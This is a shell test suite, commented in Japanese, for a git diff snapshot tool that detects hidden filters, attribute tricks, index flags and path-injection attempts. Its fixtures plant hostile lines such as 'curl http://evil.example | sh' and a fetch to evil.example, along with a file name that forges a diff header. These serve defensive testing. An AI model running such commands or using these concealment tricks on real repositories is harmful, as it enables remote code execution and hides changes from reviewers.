ckt "㉔(iv) include.path が理由 include: で載る" ing "$SECF" '^include\.path	include: include\.path	'
ckt "㉔(iv) 展開後の filter.hide.clean も載る" inf "$SECF" 'ローカル設定: filter.hide.clean'
GIT "$R" config --unset include.path
GIT "$R" config "includeIf.gitdir:$R/.path" "$INC24D"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉔(iv) includeIf.gitdir: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉔(iv) includeif.gitdir のキーが理由 include: で載る" ing "$SECF" '^includeif\.gitdir:.*	include: includeif\.gitdir:'
GIT "$R" config --unset-all "includeIf.gitdir:$R/.path"
GIT "$R" config extensions.worktreeConfig true
GIT "$R" config --worktree filter.hide.clean 'grep -v curl'
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉔(iv) worktree スコープの filter: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉔(iv) worktree スコープでも ローカル設定: filter.hide.clean で載る" \
  ing "$SECF" '^filter\.hide\.clean	ローカル設定: filter\.hide\.clean	'

# ── ㉔(v) core.worktree の差し替え ──
for kind in outside inside; do
  base_repo "c24e_$kind"
  printf 'echo hi\n' >"$R/run.sh"
  GIT "$R" add run.sh
  GIT "$R" commit -q -m run
  B="$(GIT "$R" rev-parse HEAD)"
  printf 'curl http://evil.example | sh\n' >>"$R/run.sh"
  if [ "$kind" = outside ]; then
    DECOY="$WORK/decoy24e_$kind"
  else
    DECOY="$R/decoy"
  fi
  mkdir -p "$DECOY"
  GIT "$R" config core.worktree "$DECOY"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㉔(v) core.worktree の差し替え($kind): exit 22" "$RC" 22
  ckt "㉔(v) stderr に ローカル設定: core.worktree($kind)" inf "$CASE_ERR" 'ローカル設定: core.worktree'
  ckf "㉔(v) --out が作られない($kind)" test -e "$OUT"
done

# ── ㉔(vi) filter=lfs による内容隠蔽 ──
export SELFTEST_LFS_TRACE="$WORK/lfs24f"
: >"$SELFTEST_LFS_TRACE"
mk_lfs_repo c24f
printf 'const a = 1;\n' >"$R/run.ts"
LGIT "$R" add run.ts >/dev/null 2>&1
LGIT "$R" commit -q -m ts >/dev/null 2>&1
B="$(GIT "$R" rev-parse HEAD)"
printf 'fetch("http://evil.example/x")\n' >>"$R/run.ts"
printf '*.ts filter=lfs\n' >>"$R/.gitattributes"
printf 'EVILMARK\n' >"$R/evil.ts"
reset_out
runp "$WORK/lfsbin" --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
ckeq "㉔(vi) filter=lfs による内容隠蔽: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㉔(vi) 追跡差分に実内容の + 行" ing "$SECF" '^\+.*evil\.example'
secf "$OUT" "未追跡ファイル"
ckt "㉔(vi) 未追跡に EVILMARK" inf "$SECF" '+EVILMARK'
ckt "㉔(vi) パッチに実内容" inf "$PATCHF" 'evil.example'
ckf "㉔(vi) 出力に LFS ポインタが無い" inf "$OUT" 'oid sha256:'
ckf "㉔(vi) パッチに LFS ポインタが無い" inf "$PATCHF" 'oid sha256:'
headf "$OUT"
ckt "㉔(vi) 見出しに LFS の NOTE" inf "$HDF" 'filter=lfs'
ckt "㉔(vi) 見出しに .gitattributes 変更の NOTE" inf "$HDF" '.gitattributes` が変更された'
secf "$OUT" "追跡差分(stat)"
ckf "㉔(vi) 内容を変えていない LFS 資産は stat に出ない" inf "$SECF" 'data.bin'

# ── ㉔(vi) git-lfs もスタブも無い環境 ──
for withchange in yes no; do
  base_repo "c24g_$withchange"
  printf 'BINDATA\n' >"$R/data.bin"
  printf 'plain\n' >"$R/p.txt"
  GIT "$R" add data.bin p.txt
  GIT "$R" commit -q -m plain
  B="$(GIT "$R" rev-parse HEAD)"
  printf '*.bin filter=lfs diff=lfs merge=lfs -text\n' >"$R/.gitattributes"
  GIT "$R" add .gitattributes
  GIT "$R" commit -q -m attr
  GIT "$R" config filter.lfs.clean "$LFS_CLEAN"
  GIT "$R" config filter.lfs.smudge "$LFS_SMUDGE"
  GIT "$R" config filter.lfs.process 'git-lfs filter-process'
  GIT "$R" config filter.lfs.required true
  [ "$withchange" = yes ] && printf 'changed\n' >>"$R/p.txt"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㉔(vi) git-lfs が無い環境(変更 $withchange): exit 20" "$RC" 20
  ckt "㉔(vi) stderr に git-lfs を起動できない(変更 $withchange)" inf "$CASE_ERR" 'git-lfs を起動できない'
done
unset SELFTEST_LFS_TRACE

accept_digest() { grep -e '^承認ダイジェスト: ' -- "$CASE_ERR" | tail -1 | sed 's/^承認ダイジェスト: //'; }

# ── ㉕(i) 作業ツリーの -diff / binary 属性 ──
for attr in '-diff' 'binary'; do
  base_repo "c25i_${attr#-}"
  printf 'const a = 1;\n' >"$R/a.ts"
  GIT "$R" add a.ts
  GIT "$R" commit -q -m ts
  B="$(GIT "$R" rev-parse HEAD)"
  printf 'const b = 2; // REALCHANGE\n' >>"$R/a.ts"
  printf 'NEWTSBODY\n' >"$R/new.ts"
  printf '* %s\n' "$attr" >"$R/.gitattributes"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㉕(i) 作業ツリーの「* $attr」: exit 0" "$RC" 0
  secf "$OUT" "追跡差分"
  ckt "㉕(i)「* $attr」でも追跡差分に実内容の + 行" inf "$SECF" '+const b = 2; // REALCHANGE'
  secf "$OUT" "未追跡ファイル"
  ckt "㉕(i)「* $attr」でも未追跡に +++ b/new.ts と内容行" inf "$SECF" '+NEWTSBODY'
  ckf "㉕(i)「* $attr」で Binary files 行が出力全体に無い" inf "$OUT" 'Binary files '
done

# ── ㉕(ii) core.bigFileThreshold ──
base_repo c25ii
printf 'const a = 1;\n' >"$R/a.ts"
GIT "$R" add a.ts
GIT "$R" commit -q -m ts
B="$(GIT "$R" rev-parse HEAD)"
printf 'const b = 2; // REALCHANGE\n' >>"$R/a.ts"
GIT "$R" config core.bigFileThreshold 1
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉕(ii) core.bigFileThreshold: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉕(ii) ローカル設定: core.bigfilethreshold が載る" ing "$SECF" '^core\.bigfilethreshold	ローカル設定: core\.bigfilethreshold	'
for h in "追跡差分(stat)" "追跡差分" "未追跡ファイル"; do
  secf "$OUT" "$h"
  ckt "㉕(ii) 事前検査の疑いなので「$h」の本文を生成しない" inf "$SECF" '(改竄の疑いがあるため生成しない)'
done
DG25="$(accept_digest)"
ckne "㉕(ii) stderr に承認ダイジェストが出る" "$DG25" ""
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --accept "$DG25"
ckeq "㉕(ii) --accept で復帰: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㉕(ii) --accept 後に実内容の + 行" inf "$SECF" '+const b = 2; // REALCHANGE'
ckf "㉕(ii) --accept 後に Binary files 行が無い" inf "$OUT" 'Binary files '

# ── ㉕(vii) ident 属性 ──
base_repo c25vii
printf '$Id$\ncode\n' >"$R/a.txt"
GIT "$R" add a.txt
GIT "$R" commit -q -m ident
B="$(GIT "$R" rev-parse HEAD)"
printf '*.txt ident\n' >"$R/.gitattributes"
printf '$Id: PAYLOAD $\ncode\n' >"$R/a.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉕(vii) ident 属性: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉕(vii) a.txt が理由「ident 属性: set」で載る" ing "$SECF" '^a\.txt	ident 属性: set	'
ckeq "㉕(vii) 承認ダイジェストの行が出ない" "$(accept_digest)" ""

# ── ㉕(iv) .git/info/attributes の working-tree-encoding ──
base_repo c25iv
printf 'const a = 1;\n' >"$R/app.ts"
GIT "$R" add app.ts
GIT "$R" commit -q -m app
B="$(GIT "$R" rev-parse HEAD)"
printf 'const b = 2; // REALCHANGE\n' >>"$R/app.ts"
mkdir -p "$R/.git/info"
printf 'app.ts working-tree-encoding=UTF-16LE\n' >"$R/.git/info/attributes"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉕(iv) .git/info/attributes の working-tree-encoding: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉕(iv) .git/info/attributes が載る" ing "$SECF" '^\.git/info/attributes	\.git/info/attributes	'
ckt "㉕(iv) 属性名が載る" ing "$SECF" '^app\.ts	working-tree-encoding 属性: UTF-16LE	'
secf "$OUT" "追跡差分"
ckf "㉕(iv) 追跡差分に本文が出ない" inf "$SECF" 'REALCHANGE'

# ── ㉕(v) 追跡 .gitattributes(ネストを含む)の working-tree-encoding ──
base_repo c25v
mkdir -p "$R/sub"
printf 'const a = 1;\n' >"$R/app.ts"
printf 'const c = 3;\n' >"$R/sub/nested.ts"
GIT "$R" add app.ts sub/nested.ts
GIT "$R" commit -q -m app
printf 'app.ts working-tree-encoding=UTF-16LE\n' >"$R/.gitattributes"
printf 'nested.ts working-tree-encoding=UTF-16LE\n' >"$R/sub/.gitattributes"
GIT "$R" add .gitattributes sub/.gitattributes
GIT "$R" commit -q -m attrs
B="$(GIT "$R" rev-parse HEAD)"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉕(v) 追跡 .gitattributes の working-tree-encoding: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉕(v) ルートの指定を check-attr が捕える" ing "$SECF" '^app\.ts	working-tree-encoding 属性: UTF-16LE	'
ckt "㉕(v) ネストの指定も check-attr が捕える" ing "$SECF" '^sub/nested\.ts	working-tree-encoding 属性: UTF-16LE	'

# ── ㉕(viii) .git/info/attributes が FIFO ──
base_repo c25viii
printf 'const a = 1;\n' >"$R/a.ts"
GIT "$R" add a.ts
GIT "$R" commit -q -m ts
B="$(GIT "$R" rev-parse HEAD)"
printf 'const b = 2; // REALCHANGE\n' >>"$R/a.ts"
mkdir -p "$R/.git/info"
rm -f "$R/.git/info/attributes"
mkfifo "$R/.git/info/attributes"
reset_out
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉕(viii) .git/info/attributes が FIFO: 待機せず exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉕(viii) 理由「通常ファイルでない」・3 列目が -" \
  ing "$SECF" '^\.git/info/attributes	\.git/info/attributes が通常ファイルでない	-$'
ckeq "㉕(viii) 承認ダイジェストの行が出ない" "$(accept_digest)" ""
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --accept 0000000000000000000000000000000000000000000000000000000000000000
ckeq "㉕(viii) どの値を --accept に付けても exit 22" "$RC" 22
grun --cwd "$R" --precheck
ckeq "㉕(viii) --precheck も待機せず exit 22" "$RC" 22
rm -f "$R/.git/info/attributes"

# ── ㉕(ix) -filter -working-tree-encoding だけの .gitattributes ──
base_repo c25ix
printf 'const a = 1;\n' >"$R/app.ts"
GIT "$R" add app.ts
GIT "$R" commit -q -m app
B="$(GIT "$R" rev-parse HEAD)"
printf 'const b = 2; // REALCHANGE\n' >>"$R/app.ts"
printf '*.ts -filter -working-tree-encoding\n' >"$R/.gitattributes"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉕(ix) unset の属性は疑いにならない: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㉕(ix) 本文に差分が出る" inf "$SECF" '+const b = 2; // REALCHANGE'
run --cwd "$R" --precheck
ckeq "㉕(ix) --precheck も exit 0" "$RC" 0
ckeq "㉕(ix) --precheck に承認ダイジェストの行が無い" "$(accept_digest)" ""

# ── ㉕(x) filter=unset / -filter と filter.unset.* の定義 ──
GCFG25X="$WORK/gcfg25x"
printf '[filter "unset"]\n\tclean = sh %s\n' "$STUBS/trace-clean.sh" >"$GCFG25X"
export SELFTEST_TRACE="$WORK/tr25x"
for spec in 'b.ts filter=unset' 'b.ts -filter'; do
  base_repo "c25x_$(printf '%s' "$spec" | tr ' =-' '___')"
  printf 'const b = 1;\n' >"$R/b.ts"
  printf 'const c = 1;\n' >"$R/c.ts"
  GIT "$R" add b.ts c.ts
  GIT "$R" commit -q -m b
  B="$(GIT "$R" rev-parse HEAD)"
  printf 'const c = 2; // REALCHANGE\n' >>"$R/b.ts"
  printf 'const d = 2; // OTHERCHANGE\n' >>"$R/c.ts"
  printf '%s\n' "$spec" >"$R/.gitattributes"
  : >"$SELFTEST_TRACE"
  reset_out
  runenv "GIT_CONFIG_GLOBAL=$GCFG25X" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㉕(x)「$spec」: exit 22" "$RC" 22
  secf "$OUT" "改竄の疑い"
  ckt "㉕(x)「$spec」が理由「filter 属性: unset」で載る" ing "$SECF" '^b\.ts	filter 属性: unset	'
  ckeq "㉕(x)「$spec」で clean が実行されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
  # 否定側: 疑いに載るのは b.ts だけで、属性未指定の追跡 c.ts は載らない
  # 疑いの行だけを数える(節の末尾の「承認ダイジェスト:」の行と空行は除く)
  ckeq "㉕(x)「$spec」疑いに載るのは 1 行だけ" \
    "$(grep -v '^$' "$SECF" | grep -vc '^承認ダイジェスト: ')" 1
  ckf "㉕(x)「$spec」属性未指定の c.ts は載らない" ing "$SECF" '^c\.ts	'
  ckf "㉕(x)「$spec」unspecified を理由にした行が無い" inf "$SECF" 'filter 属性: unspecified'
done
# 同じ global 設定のまま .gitattributes を置かず c.ts だけを変更した repo は exit 0
base_repo c25x_neg
printf 'const c = 1;\n' >"$R/c.ts"
GIT "$R" add c.ts
GIT "$R" commit -q -m c
B="$(GIT "$R" rev-parse HEAD)"
printf 'const d = 2; // OTHERCHANGE\n' >>"$R/c.ts"
: >"$SELFTEST_TRACE"
reset_out
runenv "GIT_CONFIG_GLOBAL=$GCFG25X" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉕(x) 否定側: filter.unset.* の定義だけでは exit 0" "$RC" 0
secf "$OUT" "改竄の疑い"
ckt "㉕(x) 否定側: 改竄の疑いが空" inf "$SECF" '(差分なし)'
secf "$OUT" "追跡差分"
ckt "㉕(x) 否定側: 本文に差分が出る" inf "$SECF" '+const d = 2; // OTHERCHANGE'
ckeq "㉕(x) 否定側: clean が実行されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0

# ── ㉕(iii) NUL を含む真のバイナリ追跡ファイル ──
base_repo c25iii
printf 'aaa\000bbb\n' >"$R/blob.dat"
printf 'plain\n' >"$R/p.txt"
GIT "$R" add blob.dat p.txt
GIT "$R" commit -q -m bin
B="$(GIT "$R" rev-parse HEAD)"
printf 'aaa\000BINMARK\n' >"$R/blob.dat"
printf 'plain2\n' >"$R/p.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉕(iii) バイナリ追跡ファイル: exit 0" "$RC" 0
secf "$OUT" "内容を省略した追跡"
ckt "㉕(iii) blob.dat が理由「バイナリ」で載る" ing "$SECF" '^blob\.dat	バイナリ$'
ckf "㉕(iii) 本文に生バイトが出ない" inf "$OUT" 'BINMARK'
secf "$OUT" "追跡差分(stat)"
ckt "㉕(iii) stat には残る" inf "$SECF" 'blob.dat'
base_repo c25iii2
printf 'aaa\000bbb\n' >"$R/blob.dat"
GIT "$R" add blob.dat
GIT "$R" commit -q -m bin
B="$(GIT "$R" rev-parse HEAD)"
printf 'aaa\000BINMARK2\n' >"$R/blob.dat"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉕(iii) 追跡変更がバイナリ 1 本だけ: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㉕(iii) 追跡差分が「内容は全て内容を省略した追跡へ」" inf "$SECF" '内容は全て `## 内容を省略した追跡` へ'
ckf "㉕(iii) 本文に生バイトが出ない" inf "$OUT" 'BINMARK2'

# ── ㉕(vi) ファイル → ディレクトリ置換とバイナリの組み合わせ ──
base_repo c25vi
printf 'plainconfig\n' >"$R/config"
GIT "$R" add config
GIT "$R" commit -q -m cfg
B="$(GIT "$R" rev-parse HEAD)"
rm -f "$R/config"
mkdir -p "$R/config"
printf 'aaa\000BIGMARK\n' >"$R/config/big.bin"
GIT "$R" add -A
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
ckeq "㉕(vi) ファイル→ディレクトリ置換 + バイナリ: exit 0" "$RC" 0
secf "$OUT" "内容を省略した追跡"
ckt "㉕(vi) config/big.bin が理由「バイナリ」で載る" ing "$SECF" '^config/big\.bin	バイナリ$'
secf "$OUT" "追跡差分"
ckt "㉕(vi) 追跡差分に config の削除が出る" inf "$SECF" '--- a/config'
ckf "㉕(vi) --out 全体に BIGMARK が無い" inf "$OUT" 'BIGMARK'
secf "$OUT" "追跡差分(stat)"
ckt "㉕(vi) stat に config が残る" ing "$SECF" 'config '
ckt "㉕(vi) stat に config/big.bin が残る" inf "$SECF" 'config/big.bin'
ckt "㉕(vi) パッチに config/big.bin が含まれる" inf "$PATCHF" 'config/big.bin'
GIT "$R" worktree add -q --detach "$WORK/at25vi" HEAD >/dev/null 2>&1
ckt "㉕(vi) パッチが別ツリーで git apply --check を通る" \
  env -u GIT_INDEX_FILE "$REAL_GIT" -C "$WORK/at25vi" apply --check -- "$PATCHF"

# ── ㉖ secret_paths の範囲 ──
base_repo c26
for g in '**' '*' '/**'; do
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob "$g"
  ckeq "㉖ 全パスに当たる glob '$g': exit 2" "$RC" 2
  ckt "㉖ '$g' の stderr に secret_paths が全パスに当たる" inf "$CASE_ERR" 'ERROR [usage] secret_paths が全パスに当たる'
  ckf "㉖ '$g' で --out が作られない" test -e "$OUT"
done
for g in '[Ss]ecret.key' '*.{pem,key}' 'config/[pd]rod.env'; do
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob "$g"
  ckeq "㉖ ブラケット / ブレースを含む glob '$g': exit 2" "$RC" 2
  ckf "㉖ '$g' で --out が作られない" test -e "$OUT"
done
mkdir -p "$R/.claude"
printf 'a: 1\n' >"$R/.claude/project-profile.yml"
GIT "$R" add .claude/project-profile.yml
GIT "$R" commit -q -m profile
B="$(GIT "$R" rev-parse HEAD)"
printf 'a: 2 # PROFILEMARK\n' >"$R/.claude/project-profile.yml"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.claude/**'
ckeq "㉖ .claude/** を渡した場合: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㉖ .claude/project-profile.yml の変更は本文に出る" inf "$SECF" 'PROFILEMARK'

# ── ㉗ .git/info/exclude の可視化 ──
base_repo c27
printf 'node_modules/\n' >"$R/.gitignore"
GIT "$R" add .gitignore
GIT "$R" commit -q -m ignore
B="$(GIT "$R" rev-parse HEAD)"
printf 'payload.ts\n' >"$R/.git/info/exclude"
printf 'PAYLOADBODY\n' >"$R/payload.ts"
mkdir -p "$R/hid1" "$R/hid2" "$R/node_modules"
printf '*\n' >"$R/hid1/.gitignore"
printf 'payload2.ts\n' >"$R/hid2/.gitignore"
printf 'PAYLOAD2BODY\n' >"$R/hid2/payload2.ts"
printf 'NODEBODY\n' >"$R/node_modules/x"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉗ .git/info/exclude の可視化: exit 0" "$RC" 0
secf "$OUT" "gitignore により除外(.gitignore 以外)"
ckt "㉗ payload.ts がパスだけ載る" ing "$SECF" '^payload\.ts$'
ckf "㉗ payload.ts の内容行は出ない" inf "$OUT" 'PAYLOADBODY'
ckf "㉗ .gitignore だけで ignore した node_modules/x はこの節に載らない" inf "$SECF" 'node_modules/x'
headf "$OUT"
ckt "㉗ 見出しに .git/info/exclude ありの NOTE" inf "$HDF" '`.git/info/exclude` あり'
ckt "㉗ 見出しに gitignore 済みの未追跡 3 件の NOTE" inf "$HDF" 'gitignore 済みの未追跡 3 件'
ckt "㉗ .gitignore の NOTE に hid1/.gitignore が載る" inf "$HDF" 'hid1/.gitignore'
ckt "㉗ .gitignore の NOTE に hid2/.gitignore が載る" inf "$HDF" 'hid2/.gitignore'
printf 'node_modules/\ndist/\n' >"$R/.gitignore"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉗ .gitignore を基準から変更: exit 0" "$RC" 0
headf "$OUT"
ckt "㉗ .gitignore 変更の NOTE が出る" inf "$HDF" '`.gitignore` が基準から変更、または未追跡で追加された'
# 追跡側が変更されていても、未追跡側のパスが NOTE に列挙される
ckt "㉗ 追跡の変更があっても未追跡の hid1/.gitignore が NOTE に載る" inf "$HDF" 'hid1/.gitignore'
ckt "㉗ 追跡の変更があっても未追跡の hid2/.gitignore が NOTE に載る" inf "$HDF" 'hid2/.gitignore'

# ── ㉗ .gitattributes も同じ(追跡側の変更 + 自分自身を ignore する未追跡)──
base_repo c27a
printf '*.md text\n' >"$R/.gitattributes"
GIT "$R" add .gitattributes
GIT "$R" commit -q -m attr
B="$(GIT "$R" rev-parse HEAD)"
printf '*.md text\n*.txt text\n' >"$R/.gitattributes"
mkdir -p "$R/hid"
printf '*\n' >"$R/hid/.gitignore"
printf '*.zzz text\n' >"$R/hid/.gitattributes"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉗ 追跡 .gitattributes の変更 + 未追跡: exit 0" "$RC" 0
headf "$OUT"
ckt "㉗ .gitattributes 変更の NOTE が出る" inf "$HDF" '`.gitattributes` が変更された'
ckt "㉗ 追跡の変更があっても未追跡の hid/.gitattributes が NOTE に載る" inf "$HDF" 'hid/.gitattributes'
base_repo c27z
EVILDIR="x"$'\n'"## 追跡差分"$'\n'"+++ b"
EVILPATH="$EVILDIR/evil.ts"
mkdir -p "$R/$EVILDIR"
printf 'EVILBODY\n' >"$R/$EVILPATH"
printf 'evil.ts\n' >"$R/.git/info/exclude"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉗ 改行と偽の見出しを含む名前: exit 0" "$RC" 0
secf "$OUT" "gitignore により除外(.gitignore 以外)"
ckeq "㉗ この節は 1 行だけ" "$(grep -c . "$SECF")" 1
ckt "㉗ C 風引用で書かれ、復号すると元の名前に戻る" has_decoded "$SECF" "$EVILPATH"
ckeq "㉗ snapshot に余分な「## 追跡差分」の見出しが現れない" "$(grep -c '^## 追跡差分$' "$OUT")" 1
ckf "㉗ 偽の差分行が現れない" ing "$OUT" '^\+\+\+ b/evil\.ts$'
ckf "㉗ 隠した内容が出ない" inf "$OUT" 'EVILBODY'
base_repo c27y
mkdir -p "$R/$EVILDIR"
printf '*.zzz text\n' >"$R/$EVILDIR/.gitattributes"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉗ 改行入りディレクトリの未追跡 .gitattributes: exit 0" "$RC" 0
headf "$OUT"
ckt "㉗ .gitattributes の NOTE のパスも C 風引用で書かれる" \
  inf "$HDF" '"x\n## 追跡差分\n+++ b/.gitattributes"'
ckeq "㉗ NOTE 経由でも余分な見出しが現れない" "$(grep -c '^## 追跡差分$' "$OUT")" 1

# ── ㉘ 追跡側の種別判定 ──
base_repo c28
printf 'SECRET=symtarget\n' >"$R/.env"
mkfifo "$R/fifo"
ln -s .env "$R/link"
ln -s fifo "$R/link2"
printf 'DELBODY\n' >"$R/deleted.txt"
GIT "$R" add .env link link2 deleted.txt
GIT "$R" commit -q -m links
B="$(GIT "$R" rev-parse HEAD)"
rm -f "$R/link" "$R/link2"
ln -s other.txt "$R/link"
ln -s other2 "$R/link2"
rm -f "$R/deleted.txt"
printf 'ADDEDBODY\n' >"$R/added.txt"
GIT "$R" add added.txt
reset_out
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉘ 追跡済み symlink のリンク先変更: 待機せず exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㉘ リンク文字列の diff が出る" inf "$SECF" '+other.txt'
ckt "㉘ FIFO を指すリンクの文字列も出る" inf "$SECF" '+other2'
ckf "㉘ 機密の値が出力全体に無い" inf "$OUT" 'SECRET=symtarget'
ckt "㉘ 新規追加の通常ファイルが出る" inf "$SECF" '+ADDEDBODY'
ckt "㉘ 削除の通常ファイルが出る" inf "$SECF" '-DELBODY'
rm -f "$R/fifo"

# ── ㉘ gitlink の変更は Subproject commit 行のまま ──
mkrepo c28g_sub
SUB28="$WORK/c28g_sub"
printf 'SECRET=sub28\n' >"$SUB28/.env"
GIT "$SUB28" add .env
GIT "$SUB28" commit -q -m s0
base_repo c28g
GIT "$R" submodule add -q -- "$SUB28" sub >/dev/null 2>&1
GIT "$R" commit -q -m addsub
B="$(GIT "$R" rev-parse HEAD)"
printf 'SECRET=sub28b\n' >"$R/sub/.env"
GIT "$R/sub" add .env
GIT "$R/sub" commit -q -m s1
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉘ gitlink の変更: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "㉘ gitlink は Subproject commit 行のまま" inf "$SECF" 'Subproject commit'
ckf "㉘ gitlink の内容を読まない" inf "$OUT" 'SECRET=sub28'

# ── ㉘ 未 stage の型変更(通常ファイル → symlink)──
base_repo c28d
printf 'PLAINBODY\n' >"$R/f.txt"
printf 'PLAINBODY\n' >"$R/g.txt"
printf 'SECRET=deepvalue\n' >"$R/.env"
GIT "$R" add f.txt g.txt .env
GIT "$R" commit -q -m plain
B="$(GIT "$R" rev-parse HEAD)"
mkfifo "$R/myfifo"
rm -f "$R/f.txt" "$R/g.txt"
ln -s myfifo "$R/f.txt"
ln -s .env "$R/g.txt"
reset_out
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉘ 未 stage の型変更: 待機せず exit 0" "$RC" 0
secf "$OUT" "内容を省略した追跡"
ckt "㉘ FIFO へのリンクが理由「作業ツリーが通常ファイルでない」で載る" ing "$SECF" '^f\.txt	作業ツリーが通常ファイルでない$'
ckt "㉘ 機密へのリンクも同じ理由で載る" ing "$SECF" '^g\.txt	作業ツリーが通常ファイルでない$'
ckf "㉘ 機密の値を読まない" inf "$OUT" 'SECRET=deepvalue'
rm -f "$R/myfifo"

# ── ㉘ stage と作業ツリーの食い違い ──
base_repo c28e
printf 'orig\n' >"$R/t.txt"
printf 'orig\n' >"$R/u.txt"
# v.dat の基準側はテキスト(stage だけをバイナリにして、判定が作業ツリー側で行われることを見る)
printf 'orig\n' >"$R/v.dat"
GIT "$R" add t.txt u.txt v.dat
GIT "$R" commit -q -m init
B="$(GIT "$R" rev-parse HEAD)"
printf 'staged text\n' >"$R/t.txt"
printf 'staged text\n' >"$R/u.txt"
printf 'aaa\000staged\n' >"$R/v.dat"
GIT "$R" add t.txt u.txt v.dat
printf 'aaa\000NULMARK\n' >"$R/t.txt"
bigfile "$R/u.txt" 1100000
printf 'TEXTBACK\n' >"$R/v.dat"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉘ stage と作業ツリーの食い違い: exit 0" "$RC" 0
secf "$OUT" "内容を省略した追跡"
ckt "㉘ 作業ツリーが NUL 入りなら理由「バイナリ」" ing "$SECF" '^t\.txt	バイナリ$'
ckt "㉘ 作業ツリーが 1 MiB 超なら理由「1 MiB 超」" ing "$SECF" '^u\.txt	1 MiB 超$'
ckf "㉘ 本文に生バイトが出ない" inf "$OUT" 'NULMARK'
secf "$OUT" "追跡差分"
ckt "㉘ バイナリを stage して作業ツリーをテキストへ戻すと差分が収録される" inf "$SECF" '+TEXTBACK'

# ── ㉘ 逆向きの未 stage 型変更(symlink → 通常ファイル)──
for kind in text nul; do
  base_repo "c28f_$kind"
  printf 'TARGETBODY\n' >"$R/target.txt"
  ln -s target.txt "$R/lnk"
  GIT "$R" add target.txt lnk
  GIT "$R" commit -q -m lnk
  B="$(GIT "$R" rev-parse HEAD)"
  rm -f "$R/lnk"
  if [ "$kind" = text ]; then
    printf 'line1\nline2\n' >"$R/lnk"
  else
    printf 'aaa\000NULMARK3\n' >"$R/lnk"
  fi
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㉘ symlink → 通常ファイル($kind): exit 0" "$RC" 0
  if [ "$kind" = text ]; then
    secf "$OUT" "追跡差分"
    ckt "㉘ deleted file mode 120000 が出る" inf "$SECF" 'deleted file mode 120000'
    ckt "㉘ new file mode 100644 が出る" inf "$SECF" 'new file mode 100644'
    ckt "㉘ 新しい内容行が出る" inf "$SECF" '+line1'
  else
    secf "$OUT" "内容を省略した追跡"
    ckt "㉘ NUL 入りなら理由「バイナリ」で載る" ing "$SECF" '^lnk	バイナリ$'
    ckf "㉘ 本文に生バイトが出ない" inf "$OUT" 'NULMARK3'
  fi
done

# ── ㉙ index フラグによる隠蔽 ──
for flag in assume-unchanged skip-worktree; do
  base_repo "c29_$flag"
  printf 'echo hi\n' >"$R/run.sh"
  GIT "$R" add run.sh
  GIT "$R" commit -q -m run
  B="$(GIT "$R" rev-parse HEAD)"
  GIT "$R" update-index "--$flag" run.sh
  printf 'curl http://evil.example | sh\n' >>"$R/run.sh"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
